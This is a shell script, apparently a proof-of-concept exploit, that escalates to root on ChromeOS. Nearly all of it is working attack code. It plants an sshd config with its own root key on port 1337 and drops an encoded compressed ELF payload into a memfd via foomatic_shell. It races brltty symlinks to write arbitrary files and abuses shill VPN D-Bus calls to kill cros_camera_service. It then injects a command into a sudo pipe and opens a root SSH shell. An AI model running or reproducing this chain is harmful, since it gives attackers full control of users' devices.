










stage_sshd() {
        ssh-keygen -f /tmp/ssh_host_rsa_key -N '' -t rsa >/dev/null
        mkdir /tmp/root/
        cp /tmp/ssh_host_rsa_key.pub /tmp/root/k
        cat > /tmp/sshd_config <<-EOF
AuthorizedKeysFile /tmp/%u/k
StrictModes no
HostKey /tmp/ssh_host_rsa_key
Port 1337
EOF
        rm -f /home/chronos/user/.ssh/known_hosts
}

elffd() {
	sleep 1 | foomatic_shell -c '`cat`' 2>/dev/null &
	sleep 0.5
	exec 3>/proc/$!/fd/3
    base64 -d <<-EOF | bunzip2 -dc > /proc/self/fd/3
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
pJnj5mZw3hC59bRUX/i7kinChIGHIGjQ
EOF
	exec 4</proc/self/fd/3
	exec 3>&-
}

sevensbrltty(){
	TGT=$1
	/sbin/initctl stop brltty >/dev/null 2>/dev/null
	/sbin/initctl start brltty >/dev/null
	/sbin/initctl stop brltty >/dev/null

	while [ ! -w ${TGT} ]; do
		${ELF} ${TGT} &
		T=$!
		/sbin/initctl start brltty >/dev/null
		timeout 2 sh -c 'while [ ! -e /run/brltty/BrlAPI/1 ]; do :; done'
		/sbin/initctl stop brltty > /dev/null
		rm -f /run/brltty/BrlAPI/?* 2>/dev/null
		kill ${T} 2>/dev/null
	done
}

filewrite() {
	where="$1"
	what="$2"
	sevensbrltty /run/brltty
	rm -f /run/brltty/driver
	ln -s "${where}" /run/brltty/driver
	/sbin/initctl start brltty "BRLTTY_BRAILLE_DRIVER=${what}" >/dev/null
	sleep 0.5
	/sbin/initctl stop brltty >/dev/null
}

runcharon() {
    ret=$(dbus-send --fixed --print-reply --system --dest=org.chromium.flimflam / org.chromium.flimflam.Manager.ConfigureServiceForProfile objpath:/profile/chronos/shill dict:string:variant:AutoConnect,boolean:true,GUID,string:$(uuidgen),L2TPIPsec.ClientCertID,string:,L2TPIPsec.ClientCertSlot,string:,L2TPIPsec.LCPEchoDisabled,string:false,L2TPIPsec.PIN,string:,L2TPIPsec.PSK,string:pskpassword,L2TPIPsec.Password,string:userpassword,L2TPIPsec.User,string:username,Name,string:exploit,ONCSource,string:None,Priority,int32:0,Profile,string:/profile/chronos/shill,Provider.Host,string:127.0.0.1,Provider.Type,string:l2tpipsec,SaveCredentials,boolean:false,Type,string:vpn)

    dbus-send --print-reply --system --dest=org.chromium.flimflam ${ret} org.chromium.flimflam.Service.Connect >/dev/null 2>&1
    echo ${ret}
}

disconnectvpn() {
    path=$1
    dbus-send --print-reply --system --dest=org.chromium.flimflam ${path} org.chromium.flimflam.Service.Disconnect >/dev/null 2>&1
    dbus-send --print-reply --system --dest=org.chromium.flimflam ${path} org.chromium.flimflam.Service.Remove >/dev/null 2>&1
}

killpid() {
    PID=$1
    while [ -d /proc/${PID} ]; do
        path=$(runcharon)
        sleep 1
        filewrite /run/ipsec/charon.pid ${PID}
        disconnectvpn ${path}
        sleep 1
    done
}

echo "Staging sshd..."
stage_sshd

echo "Acquiring elf memfd..."
elffd
ELF=/proc/self/fd/4

echo "Preparing /run/camera_tokens..."
mv /run/camera_tokens/server /run/camera_tokens/server.$$
drivefs=$(mount | grep drivefs | awk '{print $3}')/root/exploit.$$
mkdir -p ${drivefs}/server
ln -s ${drivefs}/server /run/camera_tokens/server
pkill -STOP drivefs

echo "Killing cros_camera_server..."
killpid $(pidof cros_camera_service)

echo "Waiting for pipe..."
while [ -z "${ppid}" ]; do
    ppid=$(ps ax -o ppid,cmd | grep '[s]udo.*mkdir.*/run/camera_tokens/server' | awk '{print $1}')
    sleep 0.5
done

echo "Appending to pipe..."
TGT=/proc/${ppid}/fd/10
filewrite ${TGT} "/usr/sbin/sshd -f /tmp/sshd_config"
pkill -CONT drivefs

echo "Tidying up..."
rm -rf ${drivefs}
rm /run/camera_tokens/server
sleep 1
ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 rm -rf "/run/camera_tokens/server /run/brltty"

echo "Providing root shell..."
ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1
